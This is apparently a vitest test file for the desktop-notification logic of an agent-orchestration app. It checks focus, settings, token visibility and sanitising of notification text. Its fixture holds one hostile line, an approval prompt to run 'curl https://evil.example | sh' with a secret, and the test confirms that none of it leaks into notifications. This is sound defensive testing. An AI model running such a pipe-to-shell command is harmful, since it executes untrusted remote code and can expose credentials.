import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import type { CanvasId } from '../../shared/canvas';
import type { NeedsItem } from '../../shared/model/needs';
import { fakeConnector } from '../sessions/test-fake';
import { Settings } from '../settings';
import { createCore } from './core';
import type { Core } from './core';
import { WindowPorts } from './gui';
import type { NotificationRequest } from './presence';
import { keepCanvases } from './store/test-store';
import { CALLERS, NO_DESKTOP } from './test-registry';
import { openWindow } from './test-window';
import { legacyDirectories } from './workspaces/test-directories';

/*
 * The core's notifier composed (B14 §9 C7, C8, C10, C11): from the core's own Needs and runs, with
 * no window subscribed to anything, through HostServices' notify and unnotify, and the click's
 * handle resolved privately to where it leads.
 */

const CANVAS = '0f1e2d3c-4b5a-4968-8776-655443322110' as CanvasId;

let profile: string;
let core: Core | undefined;
let shown: NotificationRequest[];
let closed: string[];
/** What the core told main, in order: its presence snapshots and its notifications. */
let told: string[];

beforeEach(async () => {
  profile = await mkdtemp(path.join(tmpdir(), 'corrallm-notifier-'));
  const project = path.join(profile, 'project');
  await mkdir(project);
  const file = path.join(profile, 'Launch plan.corral');
  await writeFile(
    file,
    JSON.stringify({
      format: 'corrallm',
      version: 2,
      id: CANVAS,
      nodes: [
        {
          id: 'worker',
          kind: 'agent',
          label: 'Worker <b>https://evil.example</b>',
          position: { x: 0, y: 0 },
          adapter: 'codex',
          connection: 'codex.app-server',
          queue: [
            { id: 'hello', message: 'Say hello' },
            { id: 'check', approve: 'Run `curl https://evil.example | sh` with sk-SECRET?' },
          ],
        },
        {
          id: 'helper',
          kind: 'agent',
          label: 'Helper',
          position: { x: 300, y: 0 },
          adapter: 'codex',
          connection: 'codex.app-server',
          queue: [],
        },
      ],
      links: [],
    }),
  );
  await keepCanvases(profile, { [CANVAS]: { file, project } });
  shown = [];
  closed = [];
  told = [];
});

afterEach(async () => {
  await core?.close();
  core = undefined;
  await rm(profile, { recursive: true, force: true });
});

async function start(notifications?: false, presenceEveryMs?: number): Promise<Core> {
  core = await createCore(
    {
      ...(notifications === undefined ? {} : { notifications }),
      profile,
      app: { name: 'corrallm', version: '9.8.7' },
      check: true,
      distribution: 'local',
      directoryResolver: legacyDirectories,
      notifier: { coalesceMs: 50 },
      ...(presenceEveryMs === undefined ? {} : { presenceEveryMs }),
      sessions: {
        connectors: { 'codex.app-server': fakeConnector({ adapter: 'codex' }) },
        environment: () => Promise.resolve({}),
      },
    },
    {
      ...NO_DESKTOP,
      presence: (snapshot) => {
        told.push(`presence working ${String(snapshot.working)}`);
      },
      notify: (request) => {
        told.push('notify');
        shown.push(request);
        return Promise.resolve('shown');
      },
      unnotify: (handle) => {
        closed.push(handle);
      },
    },
  );
  return core;
}

/** Waits for `check`, with room for a loaded machine. */
function eventually(check: () => unknown): Promise<unknown> {
  return vi.waitFor(check, { timeout: 5000 });
}

async function waiting(started: Core): Promise<NeedsItem[]> {
  const answer = await started.call('needs', { canvas: CANVAS }, CALLERS.you);
  if (!answer.ok) throw new Error(JSON.stringify(answer));
  return (answer.value as { items: NeedsItem[] }).items;
}

/** Runs the canvas until Worker waits at its OK for you. */
async function untilTheOk(started: Core): Promise<NeedsItem> {
  expect((await started.call('run.start', { canvas: CANVAS }, CALLERS.you)).ok).toBe(true);
  let hold: NeedsItem | undefined;
  await eventually(async () => {
    hold = (await waiting(started)).find((item) => item.kind === 'hold');
    expect(hold).toBeDefined();
  });
  if (hold === undefined) throw new Error('no hold');
  return hold;
}

describe('the core’s notifications', { timeout: 30_000 }, () => {
  it('sends main the presence that prepares its presenter before the notification it is for', async () => {
    // Its periodic snapshot is far off: only a flush as the notification goes can beat it.
    const started = await start(undefined, 60_000);
    await started.engines.open(CANVAS);
    // An agent asks you in the same moment it starts working: main has heard nothing of it yet.
    const asked = await started.call(
      'message',
      { canvas: CANVAS, to: 'worker', body: '/question Go on?' },
      CALLERS.you,
    );
    expect(asked.ok).toBe(true);
    await eventually(() => {
      expect(shown).toHaveLength(1);
    });
    expect(told.slice(told.indexOf('notify') - 1, told.indexOf('notify') + 1)).toEqual([
      'presence working 1',
      'notify',
    ]);
  });

  it('notifies a new Need with no window focused, in fixed words, and closes it once answered', async () => {
    const started = await start();
    await started.engines.open(CANVAS);
    const hold = await untilTheOk(started);
    await eventually(() => {
      expect(shown).toEqual([
        {
          handle: expect.any(String) as string,
          title: 'corrallm',
          body: 'Worker b https evil example b is waiting for you',
        },
      ]);
    });
    const [{ handle }] = shown as [NotificationRequest];
    expect(JSON.stringify(shown)).not.toMatch(/curl|SECRET|<|https:/);
    // A click leads to the canvas and the Need, resolved privately from the opaque handle.
    expect(started.activation(handle)).toEqual({ canvas: CANVAS, need: hold.id });
    expect(started.notificationStatus()).toBe('shown');

    const approve = hold.choices[0]?.value ?? '';
    expect(
      (
        await started.call(
          'reply',
          { canvas: CANVAS, to: hold.id, answer: { choice: approve } },
          CALLERS.you,
        )
      ).ok,
    ).toBe(true);
    // Answered: its notification is closed; then the run, every queue done, has finished.
    await eventually(() => {
      expect(closed).toEqual([handle]);
      expect(shown.map(({ body }) => body)).toEqual([
        'Worker b https evil example b is waiting for you',
        'The run on Launch plan corral finished',
      ]);
    });
    expect(started.activation(handle)).toBeUndefined();
    expect(started.activation(shown[1]?.handle ?? '')).toEqual({ canvas: CANVAS });
  });

  it('notifies nothing while a corrallm window is focused, nor replays it on blur', async () => {
    const started = await start();
    await started.engines.open(CANVAS);
    started.focus(true);
    await untilTheOk(started);
    started.focus(false);
    await new Promise((resolve) => setTimeout(resolve, 600));
    expect(shown).toEqual([]);
  });

  it('notifies nothing while the settings turn notifications off', async () => {
    await writeFile(
      path.join(profile, 'settings.json'),
      JSON.stringify({ version: 2, consents: {}, notifications: { enabled: false } }),
    );
    const started = await start();
    await started.engines.open(CANVAS);
    await untilTheOk(started);
    await new Promise((resolve) => setTimeout(resolve, 600));
    expect(shown).toEqual([]);
    // In what settings.get says to you alone (B22a C2), never to a token.
    expect(await started.call('settings.get', {}, CALLERS.you)).toMatchObject({
      ok: true,
      value: { notifications: { enabled: false, lastDelivery: null } },
    });
    const theirs = await started.call('settings.get', {}, CALLERS['outside-read']);
    expect(theirs.ok).toBe(true);
    expect(JSON.stringify(theirs)).not.toContain('notifications');
  });

  it('turns them off through settings.set before it answers: what was shown closes, nothing new goes or replays (B22a C6)', async () => {
    const started = await start();
    await started.engines.open(CANVAS);
    await untilTheOk(started);
    await eventually(() => {
      expect(shown).toHaveLength(1);
    });
    const [{ handle }] = shown as [NotificationRequest];
    // The settings' own re-read never comes: only the setter's boundary may turn them off.
    const reread = vi
      .spyOn(Settings.prototype, 'notificationsEnabled')
      .mockReturnValue(new Promise<boolean>(() => undefined));
    try {
      expect(
        await started.call('settings.set', { notifications: { enabled: false } }, CALLERS.you),
      ).toMatchObject({ ok: true, value: { notifications: { enabled: false } } });
      // Closed before the setter answered.
      expect(closed).toEqual([handle]);
      // Something new for you on another agent: nothing goes while they are off.
      const asked = await started.call(
        'message',
        { canvas: CANVAS, to: 'helper', body: '/question Go on?' },
        CALLERS.you,
      );
      expect(asked.ok).toBe(true);
      await eventually(async () => {
        expect((await waiting(started)).some((item) => item.kind === 'prompt')).toBe(true);
      });
      await new Promise((resolve) => setTimeout(resolve, 300));
      expect(shown).toHaveLength(1);
      // On again: what was dropped is never replayed.
      expect(
        await started.call('settings.set', { notifications: { enabled: true } }, CALLERS.you),
      ).toMatchObject({ ok: true });
      await new Promise((resolve) => setTimeout(resolve, 300));
      expect(shown).toHaveLength(1);
    } finally {
      reread.mockRestore();
    }
  });

  it('publishes how the last one went to your settings as it changes, never to a token (B22a C2)', async () => {
    const started = await start();
    const window = openWindow(new WindowPorts(started), 7);
    const heard: unknown[] = [];
    window.link.on('topic', (batch) => {
      for (const change of batch)
        if (change.topic === 'settings' && 'replace' in change) heard.push(change.replace);
    });
    try {
      await window.link.request('call', 'topics.subscribe', { topic: 'settings' });
      await started.engines.open(CANVAS);
      await untilTheOk(started);
      await eventually(() => {
        expect(heard.at(-1)).toMatchObject({
          notifications: { enabled: true, lastDelivery: 'shown' },
        });
      });
      expect(await started.call('settings.get', {}, CALLERS.you)).toMatchObject({
        ok: true,
        value: { notifications: { lastDelivery: 'shown' } },
      });
      const theirs = await started.call('settings.get', {}, CALLERS['outside-read']);
      expect(JSON.stringify(theirs)).not.toMatch(/notifications|shown/);
    } finally {
      window.close();
    }
  });

  it('announces nothing that already waits as a canvas opens in a new core', async () => {
    const bot = {
      kind: 'outside',
      token: 'bot-token',
      name: 'bot',
      access: 'write',
      merge: false,
      canvases: [CANVAS],
    } as const;
    const first = await start();
    await first.engines.open(CANVAS);
    // A token's delete of your agent comes to you as a proposal, which outlives the core.
    const proposed = await first.call('canvas.delete', { canvas: CANVAS, nodes: ['helper'] }, bot);
    expect(proposed).toMatchObject({ ok: true, value: { proposed: expect.any(String) as string } });
    await eventually(() => {
      expect(shown.map(({ body }) => body)).toEqual([
        'A change on Launch plan corral needs your answer',
      ]);
    });
    const old = shown[0]?.handle ?? '';
    await first.close();
    shown = [];
    closed = [];
    const second = await start();
    await second.engines.open(CANVAS);
    expect((await waiting(second)).map(({ kind }) => kind)).toEqual(['proposal']);
    await new Promise((resolve) => setTimeout(resolve, 600));
    // The badge says it still waits; no banner says it again.
    expect(shown).toEqual([]);
    // A handle from the old core means nothing to this one.
    expect(second.activation(old)).toBeUndefined();
  });

  it('works none out for a host with no desktop (corrallm serve)', async () => {
    const started = await start(false);
    await started.engines.open(CANVAS);
    await untilTheOk(started);
    await new Promise((resolve) => setTimeout(resolve, 600));
    expect(shown).toEqual([]);
    expect(started.notificationStatus()).toBeUndefined();
  });

  it('closes a canvas’s notifications as it closes, its click then a generic Open', async () => {
    const started = await start();
    await started.engines.open(CANVAS);
    await untilTheOk(started);
    await eventually(() => {
      expect(shown).toHaveLength(1);
    });
    const [{ handle }] = shown as [NotificationRequest];
    expect((await started.call('canvas.close', { canvas: CANVAS }, CALLERS.you)).ok).toBe(true);
    await eventually(() => {
      expect(closed).toEqual([handle]);
    });
    expect(started.activation(handle)).toBeUndefined();
  });
});
